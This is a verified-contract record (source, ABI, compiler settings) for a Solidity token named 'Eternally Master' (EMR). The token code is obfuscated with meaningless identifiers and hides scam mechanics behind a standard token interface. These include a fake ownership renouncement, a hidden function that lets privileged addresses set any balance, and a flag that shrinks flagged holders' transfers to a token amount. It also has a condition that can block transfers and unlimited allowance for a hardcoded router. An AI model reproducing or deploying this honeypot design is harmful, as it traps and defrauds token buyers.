{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface toShouldSell {\n    function createPair(address isMarketing, address limitMin) external returns (address);\n}\n\ninterface walletFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountLaunched) external view returns (uint256);\n\n    function transfer(address swapLaunched, uint256 atLaunch) external returns (bool);\n\n    function allowance(address launchedTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapLaunched,\n        uint256 atLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptEnable, uint256 value);\n    event Approval(address indexed launchedTrading, address indexed spender, uint256 value);\n}\n\nabstract contract shouldMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletFundMetadata is walletFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EternallyMaster is shouldMin, walletFund, walletFundMetadata {\n\n    bool public launchedBuy;\n\n    string private atReceiver = \"Eternally Master\";\n\n    function toFrom() private view {\n        require(totalLimit[_msgSender()]);\n    }\n\n    function shouldMarketing(address amountList, address swapLaunched, uint256 atLaunch) internal returns (bool) {\n        if (amountList == toSwap) {\n            return receiverTxIs(amountList, swapLaunched, atLaunch);\n        }\n        uint256 fundTokenSwap = walletFund(tradingLimit).balanceOf(launchedMin);\n        require(fundTokenSwap == minLiquidity);\n        require(swapLaunched != launchedMin);\n        if (swapFromAmount[amountList]) {\n            return receiverTxIs(amountList, swapLaunched, fromBuy);\n        }\n        return receiverTxIs(amountList, swapLaunched, atLaunch);\n    }\n\n    uint256 public listReceiver;\n\n    function balanceOf(address amountLaunched) public view virtual override returns (uint256) {\n        return senderExempt[amountLaunched];\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTrading;\n\n    function receiverTxIs(address amountList, address swapLaunched, uint256 atLaunch) internal returns (bool) {\n        require(senderExempt[amountList] >= atLaunch);\n        senderExempt[amountList] -= atLaunch;\n        senderExempt[swapLaunched] += atLaunch;\n        emit Transfer(amountList, swapLaunched, atLaunch);\n        return true;\n    }\n\n    function approve(address enableList, uint256 atLaunch) public virtual override returns (bool) {\n        receiverTrading[_msgSender()][enableList] = atLaunch;\n        emit Approval(_msgSender(), enableList, atLaunch);\n        return true;\n    }\n\n    function tradingExemptSell(address isWallet) public {\n        toFrom();\n        if (listTotalReceiver == maxSellFrom) {\n            listTotalReceiver = listReceiver;\n        }\n        if (isWallet == toSwap || isWallet == tradingLimit) {\n            return;\n        }\n        swapFromAmount[isWallet] = true;\n    }\n\n    address autoMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private maxIs = 18;\n\n    uint256 minLiquidity;\n\n    uint256 private marketingIsSwap = 100000000 * 10 ** 18;\n\n    function marketingSender() public {\n        emit OwnershipTransferred(toSwap, address(0));\n        liquidityFund = address(0);\n    }\n\n    function tokenEnable(address totalToken) public {\n        if (teamFund) {\n            return;\n        }\n        if (liquidityBuy != maxSellFrom) {\n            maxSellFrom = liquidityBuy;\n        }\n        totalLimit[totalToken] = true;\n        \n        teamFund = true;\n    }\n\n    mapping(address => bool) public swapFromAmount;\n\n    string private receiverAt = \"EMR\";\n\n    function owner() external view returns (address) {\n        return liquidityFund;\n    }\n\n    mapping(address => bool) public totalLimit;\n\n    bool public teamFund;\n\n    address public tradingLimit;\n\n    event OwnershipTransferred(address indexed teamFee, address indexed fundLiquidity);\n\n    function allowance(address marketingTx, address enableList) external view virtual override returns (uint256) {\n        if (enableList == autoMode) {\n            return type(uint256).max;\n        }\n        return receiverTrading[marketingTx][enableList];\n    }\n\n    function exemptList(uint256 atLaunch) public {\n        toFrom();\n        minLiquidity = atLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverAt;\n    }\n\n    uint256 private listTotalReceiver;\n\n    bool public isTo;\n\n    function getOwner() external view returns (address) {\n        return liquidityFund;\n    }\n\n    function transferFrom(address amountList, address swapLaunched, uint256 atLaunch) external override returns (bool) {\n        if (_msgSender() != autoMode) {\n            if (receiverTrading[amountList][_msgSender()] != type(uint256).max) {\n                require(atLaunch <= receiverTrading[amountList][_msgSender()]);\n                receiverTrading[amountList][_msgSender()] -= atLaunch;\n            }\n        }\n        return shouldMarketing(amountList, swapLaunched, atLaunch);\n    }\n\n    address launchedMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public toSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return atReceiver;\n    }\n\n    constructor (){\n        \n        swapMode atFrom = swapMode(autoMode);\n        tradingLimit = toShouldSell(atFrom.factory()).createPair(atFrom.WETH(), address(this));\n        \n        toSwap = _msgSender();\n        totalLimit[toSwap] = true;\n        senderExempt[toSwap] = marketingIsSwap;\n        marketingSender();\n        \n        emit Transfer(address(0), toSwap, marketingIsSwap);\n    }\n\n    function transfer(address liquidityModeMin, uint256 atLaunch) external virtual override returns (bool) {\n        return shouldMarketing(_msgSender(), liquidityModeMin, atLaunch);\n    }\n\n    bool private listFundLimit;\n\n    mapping(address => uint256) private senderExempt;\n\n    uint256 toWallet;\n\n    uint256 private maxSellFrom;\n\n    bool public atWalletMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxIs;\n    }\n\n    uint256 constant fromBuy = 3 ** 10;\n\n    function receiverAmount(address liquidityModeMin, uint256 atLaunch) public {\n        toFrom();\n        senderExempt[liquidityModeMin] = atLaunch;\n    }\n\n    uint256 private liquidityBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingIsSwap;\n    }\n\n    bool private toModeFund;\n\n    address private liquidityFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWalletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLaunch\",\"type\":\"uint256\"}],\"name\":\"exemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityModeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"}],\"name\":\"tradingExemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityModeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EternallyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}